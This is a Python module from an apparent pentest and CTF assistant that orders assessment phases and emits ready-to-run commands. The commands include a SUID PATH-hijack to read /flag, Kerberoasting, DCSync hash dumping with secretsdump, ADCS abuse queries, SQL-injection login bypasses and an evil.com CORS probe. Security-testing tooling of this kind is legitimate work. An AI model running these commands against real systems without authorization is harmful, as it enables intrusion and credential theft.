"""
core/planner.py

Purpose
-------
Synthesize assessment templates into logical plans and dynamically serve
the single next logical action item based on active session state, scope,
and ingested scanner findings.

Responsibilities
----------------
1. Merge multiple assessment checklists into unified tactical phases.
2. Maintain standard methodology ordering (Recon -> Enum -> Initial Access -> PrivEsc -> Exfiltration -> Evidence -> Cleanup).
3. Evaluate session scope, open ports, cloud resources, and previous steps to serve EXACTLY ONE next step for the interactive CLI.
4. Auto-populate targets and parameters via VariableEngine.
"""

from typing import List, Dict, Any, Optional
import os
import sys
import re

# Ensure core modules can be imported
CORE_DIR = os.path.dirname(os.path.abspath(__file__))
if CORE_DIR not in sys.path:
    sys.path.insert(0, CORE_DIR)

try:
    from variable_engine import VariableEngine
except ImportError:
    try:
        from core.variable_engine import VariableEngine
    except ImportError:
        VariableEngine = None


PHASE_ORDER = [
    "reconnaissance",
    "recon",
    "enumeration",
    "initial_access",
    "privilege_escalation",
    "privesc",
    "lateral_movement",
    "persistence",
    "exfiltration",
    "evidence_collection",
    "cleanup"
]


def get_phase_rank(phase: str) -> int:
    """Return standard ordering rank for a phase name."""
    clean_phase = phase.strip().lower().replace(" ", "_").replace("-", "_")
    for rank, known in enumerate(PHASE_ORDER):
        if known in clean_phase or clean_phase in known:
            return rank
    return 99  # Default fallback for unknown phases


class AssessmentPlan:
    """
    Structured assessment plan synthesized from template procedures.
    """

    def __init__(
        self,
        name: str,
        sources: List[str],
        phases: Dict[str, List[Dict[str, Any]]],
        sequential_steps: List[Dict[str, Any]]
    ):
        self.name = name
        self.sources = sources
        self.phases = phases
        self.sequential_steps = sequential_steps

    def summary(self) -> str:
        """Return formatted summary of the assessment plan."""
        lines = [
            f"=== ASSESSMENT PLAN: {self.name} ===",
            f"Source Templates: {', '.join(self.sources)}",
            f"Total Steps: {len(self.sequential_steps)}",
            ""
        ]

        current_phase = None
        for step in self.sequential_steps:
            phase = step.get("phase", "General").title()
            if phase != current_phase:
                current_phase = phase
                lines.append(f"\n[{current_phase}]")

            seq_num = step.get("sequence_number")
            action = step.get("action", "")
            tmpl_id = step.get("source_yaml_id", "")
            lines.append(f"  {seq_num}. {action} ({tmpl_id})")

        return "\n".join(lines)


class Planner:
    """
    Synthesizes YAML templates into unified execution plans and dynamically
    serves the next logical action item based on session findings.
    """

    def __init__(self, plan_name: str = "Custom Assessment Plan"):
        self.default_name = plan_name

    def create_plan(
        self,
        templates: List[Dict[str, Any]],
        custom_name: Optional[str] = None
    ) -> AssessmentPlan:
        """
        Merge templates into a structured assessment plan sorted by methodology phases.
        Maintains backward compatibility with pipeline verification suites.
        """
        plan_name = custom_name or self.default_name
        source_ids = []
        raw_steps = []

        for tmpl in templates:
            tmpl_id = tmpl.get("id", "unknown")
            source_ids.append(tmpl_id)
            tmpl_name = tmpl.get("name", tmpl_id)

            steps = tmpl.get("steps", [])
            for step in steps:
                if isinstance(step, dict):
                    step_copy = dict(step)
                    step_copy["source_yaml_id"] = tmpl_id
                    step_copy["source_yaml_name"] = tmpl_name
                    raw_steps.append(step_copy)

        # Sort steps by phase methodology rank
        raw_steps.sort(key=lambda s: get_phase_rank(s.get("phase", "")))

        phases: Dict[str, List[Dict[str, Any]]] = {}
        sequential_steps: List[Dict[str, Any]] = []

        for idx, step in enumerate(raw_steps, start=1):
            step["sequence_number"] = idx
            phase_name = step.get("phase", "general").lower()

            if phase_name not in phases:
                phases[phase_name] = []
            phases[phase_name].append(step)
            sequential_steps.append(step)

        return AssessmentPlan(
            name=plan_name,
            sources=source_ids,
            phases=phases,
            sequential_steps=sequential_steps
        )

    def get_next_step(self, session_state: Dict[str, Any]) -> Dict[str, Any]:
        """
        Dynamically evaluate the current session state, scope, targets, and ingested
        scanner findings to recommend EXACTLY ONE next logical assessment step.

        Args:
            session_state: The active session state dictionary.

        Returns:
            Dict containing step_number, phase, title, action, rationale, commands,
            expected_output, and risk_assessment.
        """
        completed_steps = session_state.get("completed_steps", [])
        completed_ids = {s.get("id", "") for s in completed_steps if s.get("id")}
        completed_titles = {s.get("title", "") for s in completed_steps if s.get("title")}

        targets = session_state.get("targets", {})
        scope = session_state.get("scope", "")
        target = session_state.get("target", "")
        target_type = session_state.get("type", "").lower()
        ingested = session_state.get("ingested_findings", {})

        ips = targets.get("ips", [])
        ports = set(targets.get("ports", []))
        domains = targets.get("domains", [])
        cloud_resources = targets.get("cloud_resources", [])
        vulnerabilities = targets.get("vulnerabilities", [])

        # Pick primary target tokens
        target_ip = ips[0] if ips else "TARGET_IP"
        target_domain = domains[0] if domains else "target.local"
        target_port = next((p for p in (443, 80, 8080, 8443) if p in ports), 443)

        # Check engagement type
        is_ctf_or_shell = (
            any(w in target_type for w in ("ctf", "linux", "shell", "privesc", "box", "pwn", "local", "privilege", "ubuntu")) or
            any(w in target.lower() for w in ("localhost", "local", "shell", "pwn.college")) or
            any(w in scope.lower() for w in ("flag", "/flag", "shell", "pwn", "ctf", "/challenge"))
        )

        is_web_or_bounty = (
            not is_ctf_or_shell and (
                any(w in target_type for w in ("bounty", "web", "api", "webapp", "url")) or
                (domains and not ips) or
                ("http" in scope.lower() or "http" in target.lower())
            )
        )

        web_target = domains[0] if domains else (target_ip if target_ip != "TARGET_IP" else "target.com")
        if not web_target.startswith("http"):
            web_url = f"https://{web_target}"
        else:
            web_url = web_target

        # --- Flag Capture Detection (CTF / Challenge Engagements) ---
        FLAG_PAT = re.compile(r'(?:(?:pwn\.college|flag|htb|ctf|picoctf|hackthebox)\{[^}\s]+\}|\b(?:FLAG|Flag):\s*[a-zA-Z0-9_\-\{\}]{8,})', re.IGNORECASE)
        all_text = " ".join(
            str(n.get("content", "")) for n in session_state.get("notes", [])
        ) + " " + " ".join(
            str(e.get("output", "") or e.get("stdout", "")) for e in session_state.get("evidence", [])
        ) + " " + " ".join(
            str(s.get("stdout", "") or s.get("evidence", "") if isinstance(s, dict) else "") for s in completed_steps
        )
        flag_match = FLAG_PAT.search(all_text)
        if flag_match:
            captured_flag = flag_match.group(0).strip()
            if "flag_captured" not in completed_ids:
                return {
                    "step_number": len(completed_steps) + 1,
                    "id": "flag_captured",
                    "phase": "evidence_collection",
                    "title": "[FLAG CAPTURED] -- Challenge Complete!",
                    "action": f"Flag captured: {captured_flag}",
                    "purpose": f"Flag successfully extracted: {captured_flag}",
                    "rationale": "The challenge objective has been achieved! The flag has been verified and recorded in the assessment session.",
                    "commands": [f"echo 'FLAG: {captured_flag}'"],
                    "expected_output": captured_flag,
                    "risk_assessment": "None — challenge complete."
                }
            else:
                return {
                    "step_number": len(completed_steps) + 1,
                    "id": "engagement_complete",
                    "phase": "cleanup",
                    "title": "Assessment Methodology Complete — Flag Secured",
                    "action": f"All challenge objectives achieved. Captured flag: {captured_flag}",
                    "purpose": "Engagement finalized.",
                    "rationale": "Challenge objective complete. Run 'report' to generate final assessment report.",
                    "commands": ["echo '[+] Assessment Complete. Run report command to export final Markdown report.'"],
                    "expected_output": "Assessment complete.",
                    "risk_assessment": "None."
                }

        # Build candidate step pipeline dynamically based on intelligence
        candidate_steps: List[Dict[str, Any]] = []

        # 0. CTF & LOCAL LINUX SHELL / PRIVILEGE ESCALATION WORKFLOW
        if is_ctf_or_shell:
            candidate_steps.append({
                "id": "ctf_env_recon",
                "phase": "reconnaissance",
                "title": "Interactive Shell & User Context Discovery",
                "action": "Inspect current user ID, shell environment, and basic operating system release",
                "purpose": "Identify current user permissions, working directory, and environment variables.",
                "rationale": (
                    "In local shell and CTF challenges (e.g. pwn.college, container labs), establishing the current "
                    "UID/GID, user groups, and current directory is essential before locating flags or running binaries."
                ),
                "commands": [
                    "id && whoami",
                    "uname -a",
                    "pwd && ls -la"
                ],
                "expected_output": "Current username, UID/GID, kernel version, and listing of current directory files.",
                "risk_assessment": "Standard non-intrusive environment queries."
            })

            candidate_steps.append({
                "id": "ctf_flag_discovery",
                "phase": "enumeration",
                "title": "Flag Artifact & Challenge Directory Location",
                "action": "Search common challenge paths for flag files and challenge binaries",
                "purpose": "Locate /flag, /challenge, or challenge-specific files and inspect their permissions.",
                "rationale": (
                    "Determine if the flag is directly readable or if permissions/ownership restrict read access "
                    "to root or a specific challenge group."
                ),
                "commands": [
                    "ls -la /flag /challenge 2>/dev/null || find / -maxdepth 3 -name '*flag*' 2>/dev/null",
                    "cat /flag 2>/dev/null || file /challenge/* 2>/dev/null"
                ],
                "expected_output": "Permissions of /flag and any executables located inside /challenge.",
                "risk_assessment": "Read-only filesystem queries."
            })

            candidate_steps.append({
                "id": "ctf_sudo_audit",
                "phase": "privilege_escalation",
                "title": "Sudo Rules & Elevated Privilege Audit",
                "action": "Inspect sudo permissions and NOPASSWD entries for current user",
                "purpose": "Identify if current user can execute commands as root or other privileged users without password.",
                "rationale": (
                    "Checking 'sudo -l' is the quickest path to privilege escalation or flag reading if sudo rules exist."
                ),
                "commands": [
                    "sudo -l",
                    "cat /etc/sudoers 2>/dev/null"
                ],
                "expected_output": "List of allowed commands for current user or prompt indicating sudo restrictions.",
                "risk_assessment": "Standard authentication/permission query."
            })

            candidate_steps.append({
                "id": "ctf_suid_capability_audit",
                "phase": "privilege_escalation",
                "title": "SUID/SGID Binaries & Linux Capabilities Audit",
                "action": "Search for binaries with SUID bit or elevated file capabilities",
                "purpose": "Discover custom challenge binaries or GTFOBins vectors that execute with effective root UID.",
                "rationale": (
                    "CTF challenges (especially pwn.college and binary exploitation) frequently use SUID binaries "
                    "(e.g., in /challenge/ or /usr/bin) to grant temporary root privileges to read /flag."
                ),
                "commands": [
                    "find / -perm -4000 -type f 2>/dev/null",
                    "getcap -r / 2>/dev/null"
                ],
                "expected_output": "List of SUID executables (e.g. /challenge/run, /usr/bin/passwd, etc.).",
                "risk_assessment": "Read-only filesystem search."
            })

            candidate_steps.append({
                "id": "ctf_binary_inspection",
                "phase": "initial_access",
                "title": "Challenge Binary Analysis & Decompilation Preparation",
                "action": "Inspect challenge executable metadata, string tables, and dynamic libraries",
                "purpose": "Analyze binary architecture, symbols, and hardcoded secrets.",
                "rationale": (
                    "Extract readable strings and binary metadata to understand required input arguments, "
                    "environment variables, or logic checks."
                ),
                "commands": [
                    "strings /challenge/* 2>/dev/null | head -n 40",
                    "objdump -d -M intel /challenge/* 2>/dev/null | head -n 40 || /challenge/* --help 2>/dev/null"
                ],
                "expected_output": "ASCII strings, function symbols, or assembly disassembly preview.",
                "risk_assessment": "Static binary analysis."
            })

            candidate_steps.append({
                "id": "ctf_process_cron_inspection",
                "phase": "enumeration",
                "title": "Background Processes & Cron Task Enumeration",
                "action": "Inspect running processes, listening internal ports, and scheduled cron jobs",
                "purpose": "Find background scripts or internal services running under higher privileges.",
                "rationale": (
                    "Check for root cronjobs or background daemons that may read or generate flags."
                ),
                "commands": [
                    "ps aux",
                    "crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null",
                    "ss -tulpn 2>/dev/null"
                ],
                "expected_output": "Process table, cron jobs, and open sockets.",
                "risk_assessment": "System process inspection."
            })

            candidate_steps.append({
                "id": "ctf_path_privesc_exploit",
                "phase": "exploitation",
                "title": "Challenge Binary Execution & Relative PATH Hijack Testing",
                "action": "Execute challenge binaries, test relative PATH injection, and extract /flag",
                "purpose": "Trigger SUID execution to obtain the flag or elevated shell access.",
                "rationale": (
                    "When challenge binaries invoke helper utilities without absolute paths (e.g. 'fortune'), "
                    "prepending an attacker-controlled directory to $PATH allows arbitrary command execution with SUID privileges."
                ),
                "commands": [
                    "echo $PATH",
                    "/challenge/run 2>/dev/null || /challenge/* 2>/dev/null",
                    "echo '#!/bin/sh\\ncat /flag' > /tmp/fortune && chmod +x /tmp/fortune && PATH=/tmp:$PATH /challenge/run 2>/dev/null || true"
                ],
                "expected_output": "Flag string or elevated command output.",
                "risk_assessment": "Local CTF challenge execution."
            })

        # 1. RECONNAISSANCE FOR WEB & BUG BOUNTY TARGETS
        if is_web_or_bounty and domains and not ips:
            candidate_steps.append({
                "id": "web_subdomain_enum",
                "phase": "reconnaissance",
                "title": "Subdomain Discovery & Asset Enumeration",
                "action": f"Discover active subdomains and probe live web services on {web_target}",
                "purpose": "Map exposed subdomains, DNS records, and active HTTP endpoints.",
                "rationale": (
                    f"Target '{web_target}' is a web application / bug bounty scope. "
                    "Subdomain enumeration maps the external attack surface before testing individual endpoints."
                ),
                "commands": [
                    f"subfinder -d {web_target} -silent | httpx -title -tech-detect -status-code",
                    f"whatweb {web_url}"
                ],
                "expected_output": "List of resolved subdomains, HTTP status codes, and detected technologies.",
                "risk_assessment": "Passive / low-footprint HTTP reconnaissance."
            })

        # 2. RECONNAISSANCE FOR HOST / NETWORK TARGETS
        elif not ports and (ips or ("." in scope and not cloud_resources)):
            candidate_steps.append({
                "id": "recon_port_scan",
                "phase": "reconnaissance",
                "title": "Network Port & Service Discovery",
                "action": f"Execute Nmap service and OS detection scan against {target_ip}",
                "purpose": "Identify exposed services, open ports, and operating system signatures.",
                "rationale": (
                    f"Target '{target_ip}' is in scope, but no open port data has been ingested yet. "
                    "Comprehensive port and service identification must be performed before specific exploits can be selected."
                ),
                "commands": [
                    f"nmap -Pn -sV -sC -T4 {target_ip}"
                ],
                "expected_output": "List of open ports, daemon banners, OS signatures, and initial script findings.",
                "risk_assessment": "Standard SYN/TCP connect traffic. High volume port scanning may trigger firewall and IDS rate-limiting."
            })

        # 2. ACTIVE DIRECTORY / WINDOWS INFRASTRUCTURE: If ports 445, 88, or 389 are open
        if any(p in ports for p in (445, 88, 389, 636, 3268)):
            candidate_steps.append({
                "id": "ad_smb_enum",
                "phase": "enumeration",
                "title": "Active Directory SMB Share & User Enumeration",
                "action": f"Enumerate domain password policy, null sessions, and readable SMB shares on {target_ip}",
                "rationale": (
                    f"Discovered SMB (port 445) and/or LDAP (port 389) open on {target_ip}. "
                    "Auditing anonymous/guest access, domain password policies, and accessible file shares."
                ),
                "commands": [
                    f"netexec smb {target_ip} -u '' -p '' --shares",
                    f"netexec smb {target_ip} --pass-pol",
                    f"netexec ldap {target_ip} -u '' -p '' --users"
                ],
                "expected_output": "Domain policy, user list, and readable SMB shares (e.g. SYSVOL, NETLOGON, public).",
                "risk_assessment": "Low risk. Generates standard SMB SessionSetup and TreeConnect events in security event logs (Event ID 4624)."
            })

            candidate_steps.append({
                "id": "ad_kerberoast",
                "phase": "privilege_escalation",
                "title": "Kerberos SPN Discovery & Kerberoasting",
                "action": f"Request TGS service tickets for accounts with ServicePrincipalNames on domain {target_domain}",
                "rationale": (
                    f"Port 88 (Kerberos) is open. Any domain account can request TGS tickets for SPNs and extract offline crackable hashes."
                ),
                "commands": [
                    f"netexec ldap {target_ip} -u [USER] -p [PASS] -k --kerberoasting hashes.txt",
                    f"hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force"
                ],
                "expected_output": "Kerberos TGS-REP etype 23 ticket hashes and recovered plaintext service account credentials.",
                "risk_assessment": "Generates Event ID 4769 (A Kerberos service ticket was requested) with encryption type 0x17."
            })

            candidate_steps.append({
                "id": "ad_adcs_audit",
                "phase": "privilege_escalation",
                "title": "ADCS Certificate Authority & Template Misconfiguration Audit",
                "action": f"Query Enterprise CA for vulnerable certificate templates (ESC1 - ESC16)",
                "rationale": (
                    "Active Directory Certificate Services frequently contain misconfigured certificate templates "
                    "that allow unprivileged domain users to request certificates on behalf of Domain Administrators."
                ),
                "commands": [
                    f"certipy find -u [USER]@{target_domain} -p [PASS] -dc-ip {target_ip} -vulnerable",
                    f"certipy find -u [USER]@{target_domain} -p [PASS] -dc-ip {target_ip} -bloodhound"
                ],
                "expected_output": "Listing of vulnerable certificate templates with Client Authentication and SAN-specification flags.",
                "risk_assessment": "Low detection footprint. Read-only LDAP query to Public Key Services container in Configuration partition."
            })

            candidate_steps.append({
                "id": "ad_dcsync_check",
                "phase": "exfiltration",
                "title": "Domain Controller Replication Privileges (DCSync)",
                "action": f"Simulate DC replication via Directory Replication Service (DRS) to extract credential database",
                "rationale": (
                    "Assess whether compromised or delegated accounts possess Replicating Directory Changes permissions."
                ),
                "commands": [
                    f"secretsdump.py {target_domain}/[USER]:[PASS]@{target_ip} -just-dc-ntlm"
                ],
                "expected_output": "NTLM password hashes for krbtgt and Domain Admin accounts.",
                "risk_assessment": "High detection likelihood. Triggers DS-Replication-Get-Changes RPC calls monitored by EDR and ATA/MDI."
            })

        # 3. WEB APPLICATION & BUG BOUNTY EXPLOITATION STEPS
        if is_web_or_bounty:
            # 3.2 Content & API Route Fuzzing
            candidate_steps.append({
                "id": "web_directory_fuzz",
                "phase": "enumeration",
                "title": "Web Application Directory & API Route Enumeration",
                "action": f"Discover hidden directories, admin panels, and API routes on {web_url}",
                "purpose": "Discover hidden endpoints, administrative interfaces, and API documentation.",
                "rationale": (
                    f"HTTP/HTTPS services detected on {web_url}. "
                    "Web fuzzing discovers unlinked administrative endpoints, Swagger/OpenAPI documentation, and backup files."
                ),
                "commands": [
                    f"ffuf -u {web_url}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403",
                    f"whatweb {web_url}"
                ],
                "expected_output": "HTTP status codes, redirect locations, discovered directories (e.g. /admin, /api/v1, /docs).",
                "risk_assessment": "Moderate traffic footprint. May generate 404 logs in web server access logs; rate-limiting recommended."
            })

            # 3.3 Parameter Discovery
            candidate_steps.append({
                "id": "web_param_discovery",
                "phase": "enumeration",
                "title": "Hidden Parameter Discovery & Endpoint Analysis",
                "action": f"Mine unlinked query and POST parameters on discovered endpoints for {web_url}",
                "purpose": "Discover hidden parameters vulnerable to injection, IDOR, or business logic bypass.",
                "rationale": (
                    "Uncover undocumented query and JSON body parameters that backend handlers accept."
                ),
                "commands": [
                    f"arjun -u {web_url} -m GET,POST",
                    f"curl -i -H 'Origin: https://evil.com' {web_url}"
                ],
                "expected_output": "Discovered valid parameter names and CORS Access-Control-Allow-Origin behavior.",
                "risk_assessment": "Low traffic fuzzing."
            })

            # 3.4 Vulnerability & Injection Verification
            candidate_steps.append({
                "id": "web_sqli_xss_validation",
                "phase": "initial_access",
                "title": "Web Input Sanitization & Injection Verification",
                "action": f"Validate parameter handling on discovered forms and endpoints for injection flaws",
                "purpose": "Validate parameters for SQL injection, XSS, SSRF, and authentication bypass.",
                "rationale": (
                    "Test user-controllable input fields identified during crawling to verify that SQL syntax or script characters are encoded."
                ),
                "commands": [
                    f"sqlmap -u \"{web_url}/search?q=test\" --batch --dbs",
                    f"curl -s -k \"{web_url}/login\" -d \"user=' OR '1'='1&pass=\" -i"
                ],
                "expected_output": "Confirmation of parameter reflection or database error/time delay indicators.",
                "risk_assessment": "High impact. Use non-destructive, benign payloads only to avoid corrupting database state."
            })

            candidate_steps.append({
                "id": "web_vuln_assessment",
                "phase": "enumeration",
                "title": "Web Application Vulnerability & Misconfiguration Scan",
                "action": f"Assess web service for outdated components, dangerous headers, and common misconfigurations",
                "rationale": (
                    f"Perform baseline vulnerability validation across web server configuration and TLS parameters."
                ),
                "commands": [
                    f"nikto -h http://{target_ip}:{target_port} -Tuning 1,2,3,b",
                    f"sslscan {target_ip}:{target_port}"
                ],
                "expected_output": "Discovered server banners, missing security headers (HSTS, CSP), and weak cipher suites.",
                "risk_assessment": "Automated security scanning alerts WAFs (Cloudflare, AWS WAF, ModSecurity)."
            })

            candidate_steps.append({
                "id": "web_sqli_xss_validation",
                "phase": "initial_access",
                "title": "Web Input Sanitization & Injection Verification",
                "action": f"Validate parameter handling on discovered forms and endpoints for injection flaws",
                "rationale": (
                    "Test user-controllable input fields identified during crawling to verify that SQL syntax or script characters are encoded."
                ),
                "commands": [
                    f"sqlmap -u \"http://{target_ip}:{target_port}/search?q=test\" --batch --dbs",
                    f"curl -s -k \"http://{target_ip}:{target_port}/login\" -d \"user=' OR '1'='1&pass=\" -i"
                ],
                "expected_output": "Confirmation of parameter reflection or database error/time delay indicators.",
                "risk_assessment": "High impact. Use non-destructive, benign payloads only to avoid corrupting database state."
            })

        # 4. CLOUD INFRASTRUCTURE (AZURE / AWS): If cloud resources discovered or scope indicates cloud
        if cloud_resources or any(w in scope.lower() for w in ("azure", "aws", "gcp", "cloud", "iam", "s3", "keyvault")):
            candidate_steps.append({
                "id": "cloud_iam_audit",
                "phase": "enumeration",
                "title": "Cloud IAM Role & Privilege Assignment Enumeration",
                "action": "Enumerate role definitions, subscriptions, and principal assignments across cloud tenant",
                "rationale": (
                    "Cloud environment identified. Over-privileged role assignments (e.g., Owner, Contributor, AdministratorAccess) "
                    "frequently allow lateral movement across tenant subscriptions and resource groups."
                ),
                "commands": [
                    "az role assignment list --all -o table",
                    "az ad user list --query '[].{UPN:userPrincipalName, AccountEnabled:accountEnabled}' -o table",
                    "aws iam get-account-authorization-details"
                ],
                "expected_output": "Comprehensive list of IAM identities, attached policies, and resource group access scopes.",
                "risk_assessment": "API read queries logged in Azure Activity Log / AWS CloudTrail. Low disruption risk."
            })

            candidate_steps.append({
                "id": "cloud_secret_store_audit",
                "phase": "privilege_escalation",
                "title": "Cloud Key Vault & Storage Account Exfiltration Audit",
                "action": "Enumerate access policies and network firewalls on Cloud Key Vaults and Storage Buckets",
                "rationale": (
                    "Cloud key vaults and storage containers often host connection strings, private API keys, and deployment credentials."
                ),
                "commands": [
                    "az keyvault list --query '[].name' -o table",
                    "az storage account list --query '[].{Name:name, AllowBlobPublicAccess:allowBlobPublicAccess}' -o table",
                    "aws s3 ls"
                ],
                "expected_output": "Listing of accessible Key Vaults, public blob permissions, and S3 bucket ACLs.",
                "risk_assessment": "Triggers KeyVault / S3 Read API telemetry in audit logging."
            })

        # 5. POST-EXPLOITATION & FINAL WRAP-UP STEPS (for enterprise pentests & network assessments)
        if not is_ctf_or_shell:
            candidate_steps.append({
                "id": "evidence_consolidation",
                "phase": "evidence_collection",
                "title": "Assessment Evidence Archiving & Chain of Custody Proof",
                "action": "Consolidate tool execution logs, discovered credential hashes, and configuration artifacts into evidence vault",
                "rationale": (
                    "Ensure all technical findings possess immutable timestamps and execution proof for the final compliance audit report."
                ),
                "commands": [
                    "echo '[+] Consolidating local execution evidence into .assessments/ archive...'",
                    "tar -czf assessment_evidence.tar.gz .assessments/ 2>/dev/null || true"
                ],
                "expected_output": "Archived evidence bundle with cryptographic integrity verification.",
                "risk_assessment": "Internal local filesystem operation. Zero network risk."
            })

            candidate_steps.append({
                "id": "assessment_cleanup",
                "phase": "cleanup",
                "title": "Assessment Artifact & Temporary Credential Cleanup",
                "action": "Purge temporary test files, created staging users, and reset modified configuration parameters",
                "rationale": (
                    "Rules of Engagement mandate complete sanitization of test artifacts to return client infrastructure to baseline."
                ),
                "commands": [
                    "echo '[+] Cleaning up temporary assessment test artifacts and local cache...'"
                ],
                "expected_output": "Confirmation that temporary test artifacts have been removed from the environment.",
                "risk_assessment": "Safe local cleanup."
            })

        # Find the first step that has NOT been completed yet
        next_step = None
        for step in candidate_steps:
            s_id = step.get("id")
            s_title = step.get("title")
            if s_id not in completed_ids and s_title not in completed_titles:
                next_step = dict(step)
                break

        if not next_step:
            # All planned actions completed!
            return {
                "step_number": len(completed_steps) + 1,
                "id": "engagement_complete",
                "phase": "cleanup",
                "title": "Assessment Methodology Complete",
                "action": "All methodology phases for the defined scope have been executed.",
                "rationale": "Every tactical assessment step has been completed or addressed. Run 'report' to generate the final audit report.",
                "commands": ["echo '[+] Assessment Complete. Run report command to export final Markdown report.'"],
                "expected_output": "Assessment complete.",
                "risk_assessment": "None."
            }

        # Assign step number
        next_step["step_number"] = len(completed_steps) + 1

        # Use VariableEngine if available to substitute dynamic variables in commands
        if VariableEngine is not None:
            var_engine = VariableEngine({
                "TARGET_IP": target_ip,
                "DOMAIN": target_domain,
                "PORT": str(target_port),
                "USER": "security.auditor",
                "PASS": "TemporaryAuditPass123!"
            })
            substituted_commands = []
            for cmd in next_step.get("commands", []):
                substituted_commands.append(var_engine.substitute(cmd))
            next_step["commands"] = substituted_commands

        return next_step
